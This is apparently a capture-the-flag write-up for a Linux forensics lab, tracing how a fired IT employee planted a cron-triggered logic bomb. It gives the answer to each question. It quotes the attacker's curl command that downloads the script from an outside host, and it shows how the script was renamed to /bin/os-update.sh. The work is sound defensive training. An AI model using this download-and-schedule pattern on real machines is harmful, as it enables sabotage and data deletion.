Use your Linux forensics knowledge to investigate an incident.

# Task 1

Hey, kid! Good, you’re here!

  

Not sure if you’ve seen the news, but an employee from the IT department of one of our clients (CyberT) got arrested by the police. The guy was running a successful phishing operation as a side gig.

  

CyberT wants us to check if this person has done anything malicious to any of their assets. Get set up, grab a cup of coffee, and meet me in the conference room.

  

## Connecting to the machine

Start the virtual machine in split-screen view by clicking on the green "Start Machine" button on the upper right section of this task. Alternatively, you can connect to the VM using the credentials below via "ssh".

Answer the questions below

Grab a cup of coffee.

# Task 2 - Linux Forensics Review

This room requires basic knowledge of Linux and is based on the [Linux Forensics](https://tryhackme.com/room/linuxforensics) room. A cheat sheet is attached below, which you can also download by clicking on the blue `Download Task Files` button on the right.

# Task 3 - Nothing suspicious ... So far

Here’s the machine our disgruntled IT user last worked on. Check if there’s anything our client needs to be worried about.

My advice: Look at the privileged commands that were run. That should get you started.

The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?

Logon to target VM using SSH
`history` we can see commands that were run.  There is nothing there that matches the mask in the answer, check `/home/cybert/.bash_history` and `/home/it-admin/.bash_history`, nothing there.

`cat /var/log/auth.log | grep sudo` shows commands run with `sudo`

Answer:  `/usr/bin/apt install dokuwiki`


What was the present working directory (PWD) when the previous command was run?

In the same output as above

Answer: `/home/cybert`

# Task 4 - Let's see if you did anything bad

Keep going. Our disgruntled IT was supposed to only install a service on this computer, so look for commands that are unrelated to that.

Answer the questions below

Which user was created after the package from the previous task was installed?

Looking the file same output

Answer: `it-admin`


A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)

Same output the command `visudo`

Answer: `Dec 28 06:27:34`


A script file was opened using the "vi" text editor. What is the name of this file?

Answer: `bomb.sh`

# Task 5 - Bomb has been planted.  But when and where?

That `bomb.sh` file is a huge red flag! While a file is already incriminating in itself, we still need to find out where it came from and what it contains. The problem is that the file does not exist anymore.

Answer the questions below

What is the command used that created the file bomb.sh?

`cat /home/it-admin/.bash_history`

Answer: `curl 10.10.158.38:8080/bomb.sh --output bomb.sh`

The file was renamed and moved to a different directory. What is the full path of this file now?

Same output we see the file editing in `VI`
`cat /home/it-admin/.viminfo`

We can see a file save as `/bin/os-update.sh`

Answer: `/bin/os-update.sh`

When was the file from the previous question last modified? (Format: Month Day HH:MM)

`ls -la --full-time /bin/os-update.sh`

Answer: `Dec 28 06:29`

What is the name of the file that will get created when the file from the first question executes?

`cat /bin/os-update.sh`

Answer: `goodbye.txt`

# Task 6 - Following the fuse

So we have a file and a motive. The question we now have is: how will this file be executed?

  

Surely, he wants it to execute at some point?  

Answer the questions below

At what time will the malicious file trigger? (Format: HH:MM AM/PM)

`cat /etc/crontab`

Answer: `08:00 AM`

# Task 7 - Conclusion

Thanks to you, we now have a good idea of what our disgruntled IT person was planning.

We know that he had downloaded a previously prepared script into the machine, which will delete all the files of the installed service if the user has not logged in to this machine in the last 30 days. It’s a textbook example of a  “logic bomb”, that’s for sure.

Look at you, second day on the job, and you’ve already solved 2 cases for me. Tell Sophie I told you to give you a raise.

Answer the questions below

I’m kidding, of course! But you did good, kid.